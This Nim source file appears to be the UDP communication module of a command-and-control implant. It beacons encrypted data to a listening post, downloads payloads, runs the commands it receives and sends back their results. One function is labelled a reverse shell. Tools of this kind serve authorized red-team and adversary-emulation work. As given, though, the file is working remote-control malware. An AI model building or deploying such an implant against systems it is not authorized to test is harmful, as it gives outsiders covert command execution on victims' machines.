import strutils
import strformat
import os
import net
import marshal
import logging
from sequtils import concat
from rawhttp import requestPayload
from contact import Contact, Beacon, Instruction, jitterSleep
from ../util/encoder import hexToSeqByte, seqByteToHex
from ../util/cryptic import toString, toByteSeq, encrypt, decrypt
from ../util/config import encryptionKey
from ../commands/commands import CommandExecution, runCommand


var logger = newConsoleLogger()

proc udpBufferedSend(conn: Socket, beacon: Beacon, contact: Contact) =
    ## Sends the agent beacon over a buffered socket.
    ##
    # Marshall the beacon with Nim's fancy marshall operator.
    var data: string = $$beacon
    let encryptedData: seq[byte] = encrypt(data, encryptionKey)
    # Convert the encrypted binary data to a hex string.
    var encryptedDataHex: string = seqByteToHex(encryptedData)
    # Send the data to the socket discarding any error.
    sendTo(conn, address = contact.address, port = Port(contact.port), data = encryptedDataHex & "\n")

proc udpRespond(conn: Socket, beacon: Beacon, contact: Contact, message: string) =
    ## Sends the result of a command execution to the listening post.
    ##
    var newBeacon: Beacon = beacon
    var unmarshalledBeacon: Beacon = to[Beacon](toString(decrypt(hexToSeqByte(message.strip()), encryptionKey)))
    newBeacon.Links = @[]
    for link in unmarshalledBeacon.Links:
        if len(link.Payload) > 0:
            requestPayload(link.Payload)
        var response: CommandExecution = runCommand(executor = link.Executor, message = link.Request)
        var newLink = link
        newLink.Response = response.bites
        newLink.Status = response.status
        newLink.Pid = response.pid
        newBeacon.Links.add(newLink)
    newBeacon.Pwd = getCurrentDir()
    udpBufferedSend(conn, newBeacon, contact)

proc udpListen(conn: Socket, beacon: Beacon, contact: Contact) =
    ## TCP reverse shell.
    ##
    udpBufferedSend(conn, beacon, contact)
    while true:
        try:
            var line: string = conn.recvLine()
            line = line.strip()
            udpRespond(conn, beacon, contact, line)
        except:
            break

proc udpCommunicate*(contact: Contact, sleep: int, beacon: Beacon) =
    ## Listens for Prelude beacons.
    ##
    while true:
        # Open a UDP socket
        let client = newSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
        logger.log(lvlInfo, fmt"Connecting to {contact.address} on port {contact.port}")
        udplisten(client, beacon, contact)
        # Sleep until the next beacon.
        jitterSleep(sleep, "UDP")
